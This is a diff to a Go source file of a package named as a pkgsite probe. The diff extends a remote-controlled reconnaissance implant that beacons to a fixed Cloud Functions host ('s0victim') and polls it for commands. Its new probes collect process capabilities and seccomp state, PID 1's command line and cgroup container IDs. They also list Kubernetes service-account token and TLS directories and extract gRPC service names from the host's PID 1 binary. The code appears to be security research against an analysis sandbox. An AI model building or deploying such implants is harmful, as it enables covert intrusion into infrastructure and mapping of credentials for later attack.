@@ -7,6 +7,7 @@ import (
 	"context"
 	"crypto/rand"
 	"crypto/sha256"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -22,6 +23,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"unicode/utf8"
 )
 
 var callbackURL string
@@ -29,14 +31,19 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.118-codex"
-	expectedAgent  = "go-cgo-pkgsite-probe-v118-bounded"
-	httpTimeout    = 15 * time.Second
-	sessionLength  = 8 * time.Minute
-	maximumSteps   = 20
-	maximumBody    = 16 * 1024
-	maximumRead    = 256 * 1024
-	maximumPath    = 512
+	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.119-codex"
+	expectedAgent      = "go-cgo-pkgsite-probe-v119-adaptive"
+	httpTimeout        = 15 * time.Second
+	sessionLength      = 10 * time.Minute
+	maximumSteps       = 50
+	maximumBody        = 16 * 1024
+	maximumRead        = 256 * 1024
+	maximumPath        = 512
+	maximumPID         = 4194304
+	maximumExe         = 384 * 1024 * 1024
+	maximumServices    = 32
+	maximumMethods     = 256
+	descriptorScanTime = 20 * time.Second
 )
 
 var fixedPaths = []string{
@@ -67,6 +74,25 @@ var directoryPrefixes = []string{
 	"/usr/local/go",
 	"/app",
 	"/bundle",
+}
+
+var projectedTokenRoots = []string{
+	"/var/run/secrets/kubernetes.io/serviceaccount",
+	"/var/run/secrets/tokens",
+	"/run/secrets/kubernetes.io/serviceaccount",
+	"/run/secrets/tokens",
+}
+
+var tlsRoots = []string{
+	"/etc/tls/client",
+	"/etc/tls/server-pool",
+}
+
+var servicePackagePrefixes = []string{
+	"sos.byteman",
+	"sos.pacman",
+	"sos.queue",
+	"sos.talisman",
 }
 
 type requestSpec struct {
@@ -103,6 +129,15 @@ type protocolResponse struct {
 	DeadlineUnix  int64       `json:"deadline_unix"`
 	Request       requestSpec `json:"request"`
 	Done          bool        `json:"done"`
+	Pending       bool        `json:"pending"`
+	PollAfterMS   int         `json:"poll_after_ms"`
+}
+
+type pollEnvelope struct {
+	Fingerprint   string `json:"fingerprint"`
+	Sequence      int    `json:"sequence"`
+	TimestampUnix int64  `json:"timestamp_unix"`
+	Transcript    string `json:"transcript_hash"`
 }
 
 type clientState struct {
@@ -209,6 +244,90 @@ type directoryMetadata struct {
 	Truncated bool             `json:"truncated"`
 }
 
+type procSecurity struct {
+	PID            int      `json:"pid"`
+	UID            []uint64 `json:"uid"`
+	GID            []uint64 `json:"gid"`
+	CapInheritable string   `json:"cap_inheritable"`
+	CapPermitted   string   `json:"cap_permitted"`
+	CapEffective   string   `json:"cap_effective"`
+	CapBounding    string   `json:"cap_bounding"`
+	CapAmbient     string   `json:"cap_ambient"`
+	NoNewPrivs     int      `json:"no_new_privs"`
+	Seccomp        int      `json:"seccomp"`
+	SeccompFilters int      `json:"seccomp_filters"`
+}
+
+type commandLineFacts struct {
+	Args      []string `json:"args"`
+	Truncated bool     `json:"truncated"`
+}
+
+type cgroupFacts struct {
+	Hostname     string   `json:"hostname"`
+	SelfLines    []string `json:"self_lines"`
+	PID1Lines    []string `json:"pid1_lines"`
+	PodHints     []string `json:"pod_hints"`
+	ContainerIDs []string `json:"container_ids"`
+}
+
+type inventoryEntry struct {
+	Name     string `json:"name"`
+	Kind     string `json:"kind"`
+	Mode     string `json:"mode"`
+	UID      uint32 `json:"uid"`
+	GID      uint32 `json:"gid"`
+	Size     int64  `json:"size"`
+	Readable bool   `json:"readable"`
+}
+
+type inventoryRoot struct {
+	Path          string           `json:"path"`
+	Exists        bool             `json:"exists"`
+	Kind          string           `json:"kind"`
+	Mode          string           `json:"mode"`
+	UID           uint32           `json:"uid"`
+	GID           uint32           `json:"gid"`
+	Size          int64            `json:"size"`
+	MountPoint    string           `json:"mount_point"`
+	FSType        string           `json:"fs_type"`
+	MountReadOnly bool             `json:"mount_read_only"`
+	SuperReadOnly bool             `json:"super_read_only"`
+	Readable      bool             `json:"readable"`
+	Writable      bool             `json:"writable"`
+	Entries       []inventoryEntry `json:"entries"`
+	Truncated     bool             `json:"truncated"`
+}
+
+type processMetadata struct {
+	PID      int          `json:"pid"`
+	PPID     int          `json:"ppid"`
+	Comm     string       `json:"comm"`
+	Exe      string       `json:"exe"`
+	MountNS  string       `json:"mount_ns"`
+	NetNS    string       `json:"net_ns"`
+	PIDNS    string       `json:"pid_ns"`
+	Security procSecurity `json:"security"`
+}
+
+type protoService struct {
+	Name    string   `json:"name"`
+	Methods []string `json:"methods"`
+}
+
+type protoServiceReport struct {
+	ExecutableBytes int64          `json:"executable_bytes"`
+	Services        []protoService `json:"services"`
+	Truncated       bool           `json:"truncated"`
+}
+
+type wireField struct {
+	number int
+	wire   int
+	value  []byte
+	varint uint64
+}
+
 type mountRecord struct {
 	point         string
 	fsType        string
@@ -244,6 +363,28 @@ func runSession(origin string) {
 		deadline = remote
 	}
 	for completed := 0; completed < maximumSteps && time.Now().Before(deadline); completed++ {
+		for next.Pending && !next.Done && time.Now().Before(deadline) {
+			pollDelay := time.Duration(next.PollAfterMS) * time.Millisecond
+			if pollDelay < 250*time.Millisecond || pollDelay > 5*time.Second {
+				return
+			}
+			time.Sleep(pollDelay)
+			poll := pollEnvelope{
+				Fingerprint: state.fingerprint, Sequence: next.Sequence,
+				TimestampUnix: time.Now().Unix(), Transcript: transcript,
+			}
+			status, body, err = call(http.MethodPost, "poll", poll)
+			if err != nil || status != http.StatusOK {
+				return
+			}
+			next = protocolResponse{}
+			if json.Unmarshal(body, &next) != nil || !validProtocolReply(next, state.fingerprint, transcript, poll.Sequence) {
+				return
+			}
+		}
+		if next.Done || next.Pending || time.Now().After(deadline) {
+			return
+		}
 		sequence := next.Sequence + 1
 		if sequence < 1 || sequence > maximumSteps {
 			return
@@ -274,8 +415,17 @@ func runSession(origin string) {
 }
 
 func validProtocolReply(value protocolResponse, fingerprint, transcript string, sequence int) bool {
-	return value.Fingerprint == fingerprint && value.Sequence == sequence && value.Transcript == transcript &&
-		value.Status == "ok" && value.Error == "" && value.TimestampUnix > 0
+	if value.Fingerprint != fingerprint || value.Sequence != sequence || value.Transcript != transcript ||
+		value.Status != "ok" || value.Error != "" || value.TimestampUnix <= 0 {
+		return false
+	}
+	if value.Done {
+		return !value.Pending && value.Request.ID == "" && len(value.Request.Args) == 0
+	}
+	if value.Pending {
+		return value.Request.ID == "" && len(value.Request.Args) == 0 && value.PollAfterMS >= 250 && value.PollAfterMS <= 5000
+	}
+	return value.Request.ID != "" && value.PollAfterMS == 0
 }
 
 func podFingerprint() string {
@@ -290,7 +440,7 @@ func podFingerprint() string {
 }
 
 func initialTranscript(fingerprint string) string {
-	digest := sha256.Sum256([]byte("owned-go-capslock-v118/2\n" + fingerprint))
+	digest := sha256.Sum256([]byte("owned-go-capslock-v119/1\n" + fingerprint))
 	return hex.EncodeToString(digest[:])
 }
 
@@ -377,10 +527,29 @@ func executeProbe(request requestSpec, state *clientState, sequence int) (any, s
 		value = collectInterfaces()
 	case "dns_summary":
 		value = collectDNS()
+	case "security_status":
+		value, err = collectSecurityStatus()
+	case "pid1_cmdline":
+		value, err = collectPID1CommandLine()
+	case "cgroup_hints":
+		value = collectCgroupFacts()
+	case "projected_token_inventory":
+		value = collectInventory(projectedTokenRoots)
+	case "tls_inventory":
+		value = collectInventory(tlsRoots)
+	case "protobuf_services":
+		value, err = collectProtoServices("/proc/1/exe")
 	case "path_meta":
 		value, err = collectPathMetadata(request.Args["path"])
 	case "dir_meta":
 		value, err = collectDirectoryMetadata(request.Args["path"])
+	case "process_meta":
+		pid, parseErr := strconv.Atoi(request.Args["pid"])
+		if parseErr != nil {
+			err = parseErr
+		} else {
+			value, err = collectProcessMetadata(pid)
+		}
 	case "write_canary":
 		value, err = runWriteCanary(request.Args["path"], state, sequence)
 	case "egress_receipt":
@@ -413,6 +582,8 @@ func validRequestShape(request requestSpec, workspace string) bool {
 		"identity": true, "pid1": true, "namespaces": true, "fixed_paths": true,
 		"fixed_mounts": true, "toolchain": true, "process_lineage": true,
 		"interfaces": true, "dns_summary": true, "egress_receipt": true,
+		"security_status": true, "pid1_cmdline": true, "cgroup_hints": true,
+		"projected_token_inventory": true, "tls_inventory": true, "protobuf_services": true,
 	}
 	if noArguments[request.ID] {
 		return len(request.Args) == 0
@@ -420,17 +591,32 @@ func validRequestShape(request requestSpec, workspace string) bool {
 	if len(request.Args) != 1 {
 		return false
 	}
-	path, ok := request.Args["path"]
-	if !ok {
-		return false
-	}
 	switch request.ID {
 	case "path_meta":
+		path, ok := request.Args["path"]
+		if !ok {
+			return false
+		}
 		return validatePathArgument(path) == nil
 	case "dir_meta":
+		path, ok := request.Args["path"]
+		if !ok {
+			return false
+		}
 		return validateDirectoryArgument(path) == nil
 	case "write_canary":
+		path, ok := request.Args["path"]
+		if !ok {
+			return false
+		}
 		return validateCanaryBase(path, workspace) == nil
+	case "process_meta":
+		pidText, ok := request.Args["pid"]
+		if !ok || pidText == "" || (len(pidText) > 1 && pidText[0] == '0') {
+			return false
+		}
+		pid, err := strconv.Atoi(pidText)
+		return err == nil && pid >= 1 && pid <= maximumPID && strconv.Itoa(pid) == pidText
 	default:
 		return false
 	}
@@ -838,7 +1024,7 @@ func runWriteCanary(base string, state *clientState, sequence int) (map[string]a
 	if _, err := rand.Read(random[:]); err != nil {
 		return nil, err
 	}
-	basename := ".go-cgo-v118-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
+	basename := ".go-cgo-v119-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
 	path := filepath.Join(base, basename)
 	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
 	if err != nil {
@@ -912,6 +1098,533 @@ func collectDNS() dnsFacts {
 	return result
 }
 
+func parseIDVector(value string) ([]uint64, error) {
+	fields := strings.Fields(value)
+	if len(fields) != 4 {
+		return nil, errors.New("invalid id vector")
+	}
+	result := make([]uint64, 0, 4)
+	for _, field := range fields {
+		item, err := strconv.ParseUint(field, 10, 32)
+		if err != nil {
+			return nil, err
+		}
+		result = append(result, item)
+	}
+	return result, nil
+}
+
+func validCapabilityMask(value string) bool {
+	if value == "" || len(value) > 32 {
+		return false
+	}
+	for _, character := range value {
+		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
+			return false
+		}
+	}
+	return true
+}
+
+func collectProcSecurity(pid int) (procSecurity, error) {
+	if pid < 1 || pid > maximumPID {
+		return procSecurity{}, errors.New("invalid pid")
+	}
+	result := procSecurity{PID: pid, UID: []uint64{}, GID: []uint64{}}
+	data, err := readBounded("/proc/"+strconv.Itoa(pid)+"/status", 64*1024)
+	if err != nil {
+		return result, err
+	}
+	seen := map[string]bool{}
+	for _, line := range strings.Split(string(data), "\n") {
+		key, value, found := strings.Cut(line, ":")
+		if !found {
+			continue
+		}
+		value = strings.TrimSpace(value)
+		switch key {
+		case "Uid":
+			result.UID, err = parseIDVector(value)
+		case "Gid":
+			result.GID, err = parseIDVector(value)
+		case "CapInh":
+			result.CapInheritable, seen[key] = strings.ToLower(value), true
+		case "CapPrm":
+			result.CapPermitted, seen[key] = strings.ToLower(value), true
+		case "CapEff":
+			result.CapEffective, seen[key] = strings.ToLower(value), true
+		case "CapBnd":
+			result.CapBounding, seen[key] = strings.ToLower(value), true
+		case "CapAmb":
+			result.CapAmbient, seen[key] = strings.ToLower(value), true
+		case "NoNewPrivs":
+			result.NoNewPrivs, err = strconv.Atoi(value)
+			seen[key] = true
+		case "Seccomp":
+			result.Seccomp, err = strconv.Atoi(value)
+			seen[key] = true
+		case "Seccomp_filters":
+			result.SeccompFilters, err = strconv.Atoi(value)
+			seen[key] = true
+		}
+		if err != nil {
+			return procSecurity{}, err
+		}
+	}
+	if len(result.UID) != 4 || len(result.GID) != 4 || result.NoNewPrivs < 0 || result.NoNewPrivs > 1 ||
+		result.Seccomp < 0 || result.Seccomp > 2 || result.SeccompFilters < 0 {
+		return procSecurity{}, errors.New("incomplete process status")
+	}
+	for _, key := range []string{"CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb", "NoNewPrivs", "Seccomp", "Seccomp_filters"} {
+		if !seen[key] {
+			return procSecurity{}, errors.New("missing process status field")
+		}
+	}
+	for _, mask := range []string{result.CapInheritable, result.CapPermitted, result.CapEffective, result.CapBounding, result.CapAmbient} {
+		if !validCapabilityMask(mask) {
+			return procSecurity{}, errors.New("invalid capability mask")
+		}
+	}
+	return result, nil
+}
+
+func collectSecurityStatus() (map[string]procSecurity, error) {
+	self, err := collectProcSecurity(os.Getpid())
+	if err != nil {
+		return nil, err
+	}
+	pid1, err := collectProcSecurity(1)
+	if err != nil {
+		return nil, err
+	}
+	return map[string]procSecurity{"self": self, "pid1": pid1}, nil
+}
+
+func sensitiveArgument(value string) bool {
+	key := value
+	if index := strings.IndexByte(key, '='); index >= 0 {
+		key = key[:index]
+	}
+	key = strings.ToLower(key)
+	for _, fragment := range []string{"password", "passwd", "token", "secret", "credential", "authorization", "cookie"} {
+		if strings.Contains(key, fragment) {
+			return true
+		}
+	}
+	return false
+}
+
+func collectPID1CommandLine() (commandLineFacts, error) {
+	data, err := readBounded("/proc/1/cmdline", 64*1024)
+	if err != nil {
+		return commandLineFacts{}, err
+	}
+	parts := bytes.Split(data, []byte{0})
+	result := commandLineFacts{Args: []string{}, Truncated: len(parts) > 33}
+	for _, part := range parts {
+		if len(part) == 0 {
+			continue
+		}
+		if len(result.Args) == 32 {
+			result.Truncated = true
+			break
+		}
+		argument := string(part)
+		if sensitiveArgument(argument) {
+			if index := strings.IndexByte(argument, '='); index >= 0 {
+				argument = argument[:index] + "=_redacted_"
+			} else {
+				argument = "_redacted_"
+			}
+		}
+		if len(argument) > 256 {
+			argument = argument[:256]
+			result.Truncated = true
+		}
+		result.Args = append(result.Args, sanitizeText(argument, 256))
+	}
+	return result, nil
+}
+
+func boundedProcLines(path string) []string {
+	data, err := readBounded(path, 64*1024)
+	if err != nil {
+		return []string{}
+	}
+	result := []string{}
+	for _, line := range strings.Split(string(data), "\n") {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		if len(result) == 32 {
+			break
+		}
+		result = append(result, sanitizeText(line, 256))
+	}
+	return result
+}
+
+func hexadecimalToken(value string, minimum, maximum int) bool {
+	if len(value) < minimum || len(value) > maximum {
+		return false
+	}
+	for _, character := range value {
+		if (character < '0' || character > '9') && (character < 'a' || character > 'f') && (character < 'A' || character > 'F') {
+			return false
+		}
+	}
+	return true
+}
+
+func appendUnique(values []string, value string, maximum int) []string {
+	if value == "" || len(values) >= maximum {
+		return values
+	}
+	for _, existing := range values {
+		if existing == value {
+			return values
+		}
+	}
+	return append(values, value)
+}
+
+func extractCgroupHints(lines []string) ([]string, []string) {
+	pods, containers := []string{}, []string{}
+	for _, line := range lines {
+		parts := strings.FieldsFunc(line, func(character rune) bool {
+			return character == '/' || character == ':' || character == '.'
+		})
+		for _, part := range parts {
+			lower := strings.ToLower(part)
+			if strings.HasPrefix(lower, "pod") && len(lower) >= 11 && len(lower) <= 80 {
+				candidate := sanitizeText(lower, 80)
+				pods = appendUnique(pods, candidate, 8)
+			}
+			trimmed := strings.TrimSuffix(strings.TrimSuffix(lower, ".scope"), ".slice")
+			for _, prefix := range []string{"docker-", "cri-containerd-", "crio-"} {
+				trimmed = strings.TrimPrefix(trimmed, prefix)
+			}
+			if hexadecimalToken(trimmed, 32, 64) {
+				containers = appendUnique(containers, trimmed, 8)
+			}
+		}
+	}
+	return pods, containers
+}
+
+func collectCgroupFacts() cgroupFacts {
+	selfLines := boundedProcLines("/proc/self/cgroup")
+	pid1Lines := boundedProcLines("/proc/1/cgroup")
+	pods, containers := extractCgroupHints(append(append([]string{}, selfLines...), pid1Lines...))
+	hostname, _ := os.Hostname()
+	return cgroupFacts{
+		Hostname: sanitizeText(hostname, 128), SelfLines: selfLines, PID1Lines: pid1Lines,
+		PodHints: pods, ContainerIDs: containers,
+	}
+}
+
+func inventoryDirectory(path string) ([]inventoryEntry, bool) {
+	fd, err := syscall.Open(path, syscall.O_RDONLY|syscall.O_DIRECTORY|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0)
+	if err != nil {
+		return []inventoryEntry{}, false
+	}
+	file := os.NewFile(uintptr(fd), path)
+	if file == nil {
+		_ = syscall.Close(fd)
+		return []inventoryEntry{}, false
+	}
+	defer file.Close()
+	entries, err := file.ReadDir(33)
+	if err != nil && !errors.Is(err, io.EOF) {
+		return []inventoryEntry{}, false
+	}
+	truncated := len(entries) > 32
+	if truncated {
+		entries = entries[:32]
+	}
+	result := make([]inventoryEntry, 0, len(entries))
+	for _, entry := range entries {
+		name := entry.Name()
+		if name == "" || name == "." || name == ".." || strings.ContainsRune(name, '/') || strings.ContainsRune(name, 0) {
+			continue
+		}
+		if len(name) > 255 {
+			name = name[:255]
+		}
+		full := filepath.Join(path, entry.Name())
+		info, statErr := os.Lstat(full)
+		if statErr != nil {
+			continue
+		}
+		item := inventoryEntry{Name: name, Kind: kindFor(info), Mode: modeFor(info), Size: info.Size(), Readable: syscall.Access(full, 4) == nil}
+		if stat, ok := info.Sys().(*syscall.Stat_t); ok {
+			item.UID, item.GID = stat.Uid, stat.Gid
+		}
+		result = append(result, item)
+	}
+	sort.Slice(result, func(i, j int) bool { return result[i].Name < result[j].Name })
+	return result, truncated
+}
+
+func collectInventory(paths []string) []inventoryRoot {
+	mounts := collectMounts()
+	result := make([]inventoryRoot, 0, len(paths))
+	for _, path := range paths {
+		metadata, err := baseMetadata(path)
+		if err != nil {
+			metadata = metadataFact{Path: path, Kind: "missing", Mode: "0000"}
+		}
+		mount := mountFor(path, mounts)
+		item := inventoryRoot{
+			Path: path, Exists: metadata.Exists, Kind: metadata.Kind, Mode: metadata.Mode,
+			UID: metadata.UID, GID: metadata.GID, Size: metadata.Size,
+			MountPoint: mount.point, FSType: mount.fsType,
+			MountReadOnly: mount.mountReadOnly, SuperReadOnly: mount.superReadOnly,
+			Readable: syscall.Access(path, 4) == nil, Writable: syscall.Access(path, 2) == nil,
+			Entries: []inventoryEntry{},
+		}
+		if metadata.Exists && metadata.Kind == "directory" {
+			item.Entries, item.Truncated = inventoryDirectory(path)
+		}
+		result = append(result, item)
+	}
+	return result
+}
+
+func collectProcessMetadata(pid int) (processMetadata, error) {
+	security, err := collectProcSecurity(pid)
+	if err != nil {
+		return processMetadata{}, err
+	}
+	result := processMetadata{
+		PID: pid, Comm: readComm(pid), Security: security,
+		MountNS: readNamespace("/proc/" + strconv.Itoa(pid) + "/ns/mnt"),
+		NetNS:   readNamespace("/proc/" + strconv.Itoa(pid) + "/ns/net"),
+		PIDNS:   readNamespace("/proc/" + strconv.Itoa(pid) + "/ns/pid"),
+	}
+	result.PPID, err = parentPID(pid)
+	if err != nil && pid != 1 {
+		return processMetadata{}, err
+	}
+	if executable, linkErr := os.Readlink("/proc/" + strconv.Itoa(pid) + "/exe"); linkErr == nil {
+		result.Exe = sanitizeText(executable, 256)
+	}
+	return result, nil
+}
+
+func consumeField(data []byte, offset int) (wireField, int, bool) {
+	if offset >= len(data) {
+		return wireField{}, offset, false
+	}
+	key, size := binary.Uvarint(data[offset:])
+	if size <= 0 {
+		return wireField{}, offset, false
+	}
+	offset += size
+	field := wireField{number: int(key >> 3), wire: int(key & 7)}
+	if field.number <= 0 {
+		return wireField{}, offset, false
+	}
+	switch field.wire {
+	case 0:
+		value, width := binary.Uvarint(data[offset:])
+		if width <= 0 {
+			return wireField{}, offset, false
+		}
+		field.varint, offset = value, offset+width
+	case 1:
+		if offset+8 > len(data) {
+			return wireField{}, offset, false
+		}
+		field.value, offset = data[offset:offset+8], offset+8
+	case 2:
+		length, width := binary.Uvarint(data[offset:])
+		if width <= 0 {
+			return wireField{}, offset, false
+		}
+		offset += width
+		if length > uint64(len(data)-offset) {
+			return wireField{}, offset, false
+		}
+		field.value, offset = data[offset:offset+int(length)], offset+int(length)
+	case 5:
+		if offset+4 > len(data) {
+			return wireField{}, offset, false
+		}
+		field.value, offset = data[offset:offset+4], offset+4
+	default:
+		return wireField{}, offset, false
+	}
+	return field, offset, true
+}
+
+func protobufFields(data []byte) ([]wireField, bool) {
+	result := []wireField{}
+	for offset := 0; offset < len(data); {
+		field, next, ok := consumeField(data, offset)
+		if !ok || next <= offset {
+			return nil, false
+		}
+		result = append(result, field)
+		offset = next
+	}
+	return result, true
+}
+
+func firstProtoString(values []wireField, number int) string {
+	for _, value := range values {
+		if value.number == number && value.wire == 2 && utf8.Valid(value.value) {
+			return string(value.value)
+		}
+	}
+	return ""
+}
+
+func descriptorAt(data []byte, start int) ([]byte, bool) {
+	const maximumDescriptor = 1024 * 1024
+	limit := len(data)
+	if start+maximumDescriptor < limit {
+		limit = start + maximumDescriptor
+	}
+	data = data[:limit]
+	offset := start
+	seenName := false
+	for offset < len(data) {
+		field, next, ok := consumeField(data, offset)
+		if !ok || next <= offset {
+			return nil, false
+		}
+		if !seenName {
+			if field.number != 1 || field.wire != 2 || !bytes.HasSuffix(field.value, []byte(".proto")) {
+				return nil, false
+			}
+			seenName = true
+		}
+		offset = next
+		if field.number == 12 && field.wire == 2 && (bytes.Equal(field.value, []byte("proto3")) || bytes.Equal(field.value, []byte("proto2"))) {
+			return data[start:offset], true
+		}
+		if field.number > 14 {
+			return nil, false
+		}
+	}
+	return nil, false
+}
+
+func allowedServicePackage(value string) bool {
+	for _, prefix := range servicePackagePrefixes {
+		if value == prefix || strings.HasPrefix(value, prefix+".") {
+			return true
+		}
+	}
+	return false
+}
+
+func validProtoName(value string, allowDot bool) bool {
+	if value == "" || len(value) > 256 {
+		return false
+	}
+	for _, character := range value {
+		if (character >= 'a' && character <= 'z') || (character >= 'A' && character <= 'Z') ||
+			(character >= '0' && character <= '9') || character == '_' || (allowDot && character == '.') {
+			continue
+		}
+		return false
+	}
+	return true
+}
+
+func servicesFromDescriptor(raw []byte) []protoService {
+	values, ok := protobufFields(raw)
+	if !ok {
+		return nil
+	}
+	packageName := firstProtoString(values, 2)
+	if !allowedServicePackage(packageName) || !validProtoName(packageName, true) {
+		return nil
+	}
+	result := []protoService{}
+	for _, value := range values {
+		if value.number != 6 || value.wire != 2 {
+			continue
+		}
+		serviceFields, valid := protobufFields(value.value)
+		if !valid {
+			continue
+		}
+		serviceName := firstProtoString(serviceFields, 1)
+		if !validProtoName(serviceName, false) {
+			continue
+		}
+		service := protoService{Name: packageName + "." + serviceName, Methods: []string{}}
+		for _, methodValue := range serviceFields {
+			if methodValue.number != 2 || methodValue.wire != 2 {
+				continue
+			}
+			methodFields, methodValid := protobufFields(methodValue.value)
+			if !methodValid {
+				continue
+			}
+			method := firstProtoString(methodFields, 1)
+			if validProtoName(method, false) {
+				service.Methods = appendUnique(service.Methods, method, 64)
+			}
+		}
+		sort.Strings(service.Methods)
+		result = append(result, service)
+	}
+	return result
+}
+
+func collectProtoServices(path string) (protoServiceReport, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return protoServiceReport{}, err
+	}
+	defer file.Close()
+	info, err := file.Stat()
+	if err != nil || info.Size() < 1 || info.Size() > maximumExe {
+		return protoServiceReport{}, errors.New("executable outside scan bound")
+	}
+	data, err := syscall.Mmap(int(file.Fd()), 0, int(info.Size()), syscall.PROT_READ, syscall.MAP_PRIVATE)
+	if err != nil {
+		return protoServiceReport{}, err
+	}
+	defer syscall.Munmap(data)
+	report := protoServiceReport{ExecutableBytes: info.Size(), Services: []protoService{}}
+	seen := map[string]bool{}
+	methodCount := 0
+	deadline := time.Now().Add(descriptorScanTime)
+	for offset := 0; offset < len(data); offset++ {
+		if offset%(1024*1024) == 0 && time.Now().After(deadline) {
+			report.Truncated = true
+			break
+		}
+		if data[offset] != 0x0a {
+			continue
+		}
+		raw, ok := descriptorAt(data, offset)
+		if !ok {
+			continue
+		}
+		for _, service := range servicesFromDescriptor(raw) {
+			if seen[service.Name] {
+				continue
+			}
+			if len(report.Services) == maximumServices || methodCount+len(service.Methods) > maximumMethods {
+				report.Truncated = true
+				continue
+			}
+			seen[service.Name] = true
+			methodCount += len(service.Methods)
+			report.Services = append(report.Services, service)
+		}
+	}
+	sort.Slice(report.Services, func(i, j int) bool { return report.Services[i].Name < report.Services[j].Name })
+	return report, nil
+}
+
 func call(method, suffix string, value any) (int, []byte, error) {
 	body, err := json.Marshal(value)
 	if err != nil || len(body) > maximumBody {
@@ -967,7 +1680,7 @@ func validateRuntimeConfiguration() error {
 	parsed, err := url.Parse(callbackURL)
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-v118-hi-codex/v1/session/"+callbackSession {
+		parsed.Path != "/go-cgo-v119-adaptive-codex/v1/session/"+callbackSession {
 		return errors.New("invalid fixed callback URL")
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
